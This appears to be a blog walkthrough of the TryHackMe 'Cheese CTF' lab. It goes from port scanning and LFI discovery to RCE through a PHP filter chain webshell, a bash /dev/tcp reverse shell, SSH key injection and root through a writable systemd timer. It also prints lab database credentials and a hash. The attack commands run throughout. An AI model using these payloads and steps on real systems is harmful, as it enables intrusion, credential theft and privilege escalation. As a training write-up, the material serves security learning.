---
layout: post
title: "TryHackMe - Cheese CTF"
date: 2026-01-03 15:15:00 -0000
categories: thm
excerpt: "Exploiting LFI via PHP filter chains for RCE, lateral movement via world-writable SSH authorized_keys, and privilege escalation through world-writable systemd timers."
featured_image: "/assets/images/thm-cheese-ctf/thm-cheese-ctf-hero.jpeg"
---

# The Cheese Shop: Comprehensive Walkthrough

This walkthrough details the step-by-step exploitation of the "Cheese Shop" machine, from initial web enumeration to root privilege escalation via systemd.

## 1. Initial Reconnaissance

The target was at `10.65.153.213`. We began with a fast Nmap scan to identify any open ports.

```bash
nmap -F 10.65.153.213
```

**Initial Results:**
The output was unusually noisy, showing dozens of open ports (e.g., 7, 9, 13, 21, 25, 53, 79, etc.). This behavior is typical of `portspoof`, a service designed to slow down attackers by emulating thousands of open ports.

To cut through the noise, we ran a targeted service version scan on common ports to identify which ones were hosting actual services.

```bash
nmap -sV -p 22,80 10.65.153.213
```

**Verified Services:**
- **Port 22:** OpenSSH 8.2p1 (Ubuntu 4ubuntu0.13)
- **Port 80:** Apache httpd 2.4.41 (Ubuntu)

With the real entry points identified, we focused our attention on the web server.

## 2. Web Enumeration and LFI Discovery

Visiting the website showed "The Cheese Shop". A "Login" link led to `login.php`. To understand the backend logic, we performed directory enumeration and searched for common source disclosure files (e.g., `.bak`, `.source`, `.old`, `.phps`).

Using a tool like `gobuster` or simple manual guessing, we identified an accessible source file:

```bash
# Example of finding the source file using gobuster
gobuster dir -u http://10.65.153.213/ -w /usr/share/wordlists/dirb/common.txt -x php,source,bak
```

The file `login.php.source` was found, which provided critical insights into the backend logic, including database credentials and a hint toward a hidden script.

### login.php Source Code (Snippet):
```php
<?php
$servername = "localhost";
$user = "comte";
$password = "VeryCheesyPassword";
$dbname = "users";

$conn = new mysqli($servername, $user, $password, $dbname);

// ... (Authentication Logic)

if ($result->num_rows == 1) {
     // Successful login redirects to a secret script
     header("Location: secret-script.php?file=supersecretadminpanel.html");
     exit;
}
?>
```

The source revealed that successful authentication redirects to `secret-script.php` with a `file` parameter. Testing this parameter with `/etc/passwd` confirmed a Local File Inclusion (LFI) vulnerability.

```bash
curl "http://10.65.153.213/secret-script.php?file=/etc/passwd"
```

## 3. Remote Code Execution (RCE)

To escalate the LFI to RCE, we used a PHP filter chain technique. This allows us to inject arbitrary PHP code into the execution flow without needing to upload a file by leveraging `php://filter` and multiple `convert.iconv` transformations to "type" out our payload in memory.

### The Tool: php_filter_chain_generator.py

This script generates a long chain of PHP filters that, when processed, result in the desired string (in our case, a PHP shell). The original tool can be found here: [GitHub - synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py)

```python
#!/usr/bin/env python3
import argparse
import base64
import re

# ... [Full Script Content]
# Mapping for base64 characters to iconv filters
conversions = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    # ...
}

def generate_filter_chain(chain, debug_base64 = False):

    encoded_chain = chain
    # generate some garbage base64
    filters = "convert.iconv.UTF8.CSISO2022KR|"
    filters += "convert.base64-encode|"
    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file
    filters += "convert.iconv.UTF8.UTF7|"


    for c in encoded_chain[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"
    if not debug_base64:
        # don't add the decode while debugging chains
        filters += "convert.base64-decode"

    final_payload = f"php://filter/{filters}/resource={file_to_use}"
    return final_payload

def main():

    # Parsing command line arguments
    parser = argparse.ArgumentParser(description="PHP filter chain generator.")

    parser.add_argument("--chain", help="Content you want to generate. (you will maybe need to pad with spaces for your payload to work)", required=False)
    parser.add_argument("--rawbase64", help="The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.", required=False)
    args = parser.parse_args()
    if args.chain is not None:
        chain = args.chain.encode('utf-8')
        base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
        chain = generate_filter_chain(base64_value)
        print(f"[+] The following gadget chain will generate the following code : {args.chain} (base64 value: {base64_value})")
        print(chain)
    if args.rawbase64 is not None:
        rawbase64 = args.rawbase64.replace("=", "")
        match = re.search("^([A-Za-z0-9+/])*$", rawbase64)
        if (match):
            chain = generate_filter_chain(rawbase64, True)
            print(chain)
        else:
            print ("[-] Base64 string required.")
            exit(1)

if __name__ == "__main__":
    main()
```

**Generating the Payload:**
We generated a chain to execute `system($_GET['cmd'])`:
```bash
python3 php_filter_chain_generator.py --chain "<?php system(\"
$_GET['cmd']\"); ?>"
```

**Executing Commands:**
By appending the generated chain to the `file` parameter, we could execute system commands:
```bash
curl -s "http://10.65.153.213/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...&cmd=id"
```

## 4. Lateral Movement: Gaining User Access

With RCE achieved, we began exploring the system as the `www-data` user. 

### Achieving a Stable Shell
To make exploration easier, we triggered a reverse shell back to our machine.

```bash
# On our machine:
nc -lvnp 4444

# Via the RCE (URL encoded):
curl -s "http://10.65.153.213/secret-script.php?file=[CHAIN]&cmd=bash+-c+\'bash+-i+>%26+/dev/tcp/[YOUR_IP]/4444+0>%261'"
```

### Database Enumeration
We used the credentials found in `login.php.source` (`comte` / `VeryCheesyPassword`) to query the local MySQL database.

```bash
# Command executed via the cmd parameter in our RCE
mysql -u comte -pVeryCheesyPassword -e 'SELECT * FROM users.users;'
```

**Output:**
```text
id	username	password
1	comte	5b0c2e1b4fe1410e47f26feff7f4fc4c
```

### Discovering Insecure Permissions
While exploring the file system via RCE to find privilege escalation vectors, we enumerated the home directories. A recursive `ls -la` on `/home/comte` revealed a major security misconfiguration in the SSH directory.

```bash
# Enumerating home directory permissions
ls -laR /home/comte
```

**Discovery:**
The `.ssh` directory was accessible, and more importantly, the `authorized_keys` file was world-writable.

```text
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .ssh
-rw-rw-rw- 1 comte comte    0 Mar 25  2024 /home/comte/.ssh/authorized_keys
```

The permission `-rw-rw-rw-` (666) on `authorized_keys` meant that our `www-data` user could simply append a public key to the file and gain SSH access as `comte`.

### Exploitation Step: SSH Key Injection
We generated an SSH key pair on our local machine and used the RCE to inject the public key.

```bash
# 1. Generate key locally
ssh-keygen -t rsa -f mykey

# 2. Append public key via RCE (Base64 encoded to ensure clean transfer)
B64PUBKEY=$(cat mykey.pub | base64 -w 0)
curl -s "http://10.65.153.213/secret-script.php?file=[CHAIN]&cmd=echo+'$B64PUBKEY'+|+base64+-d+>>+/home/comte/.ssh/authorized_keys"

# 3. Login as comte
ssh -i mykey comte@10.65.153.213
```

## 5. Privilege Escalation to Root

As the user `comte`, we checked our sudo privileges:
```bash
sudo -l
```

**Results:**
```text
(ALL) NOPASSWD: /bin/systemctl daemon-reload
(ALL) NOPASSWD: /bin/systemctl restart exploit.timer
(ALL) NOPASSWD: /bin/systemctl start exploit.timer
(ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

We investigated the associated systemd unit files:

### /etc/systemd/system/exploit.service
```ini
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

The service was designed to copy `xxd` to `/opt/xxd` and make it a SUID binary. The timer `/etc/systemd/system/exploit.timer` was world-writable, allowing us to modify its execution schedule.

**Modifying the Timer:**
We changed the timer to run immediately upon activation (`OnActiveSec=1s`).

```bash
echo -e '[Unit]\nDescription=Exploit Timer\n\n[Timer]\nOnActiveSec=1s\nUnit=exploit.service\n\n[Install]\nWantedBy=timers.target' > /etc/systemd/system/exploit.timer
```

**Triggering the Exploit:**
```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl start exploit.timer
```

## 6. Capturing the Flags

Once the timer triggered the service, `/opt/xxd` became a SUID root binary. We used it to read the root flag.

**User Flag:**
```bash
cat /home/comte/user.txt
# THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

**Root Flag:**
```bash
/opt/xxd /root/root.txt | xxd -r
# THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```


## tl;dr  
## Target: 10.65.153.213
- [x] Initial Enumeration: Found ports 22, 80
- [x] LFI in secret-script.php?file=
- [x] RCE via PHP filter chain: <?php system($_GET["cmd"]); ?>
- [x] Got reverse shell as www-data
- [x] Found DB credentials: comte / VeryCheesyPassword
- [x] Found user comte hash: 5b0c2e1b4fe1410e47f26feff7f4fc4c
- [x] Found world-writable .ssh/authorized_keys for comte
- [x] Gained SSH access as comte
- [x] Found user.txt: THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
- [x] Found world-writable /etc/systemd/system/exploit.timer
- [x] Exploit: Modify timer to trigger exploit.service, run sudo systemctl daemon-reload && start exploit.timer
- [x] Gained SUID root xxd binary at /opt/xxd
- [x] Read root.txt: THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}



## Conclusion
The exploitation path involved:
1. Identifying LFI in a web parameter.
2. Converting LFI to RCE via PHP filter chains.
3. Exploiting insecure file permissions in `.ssh` to gain a persistent shell.
4. Exploiting world-writable systemd timer configurations and sudo privileges to gain SUID root access.
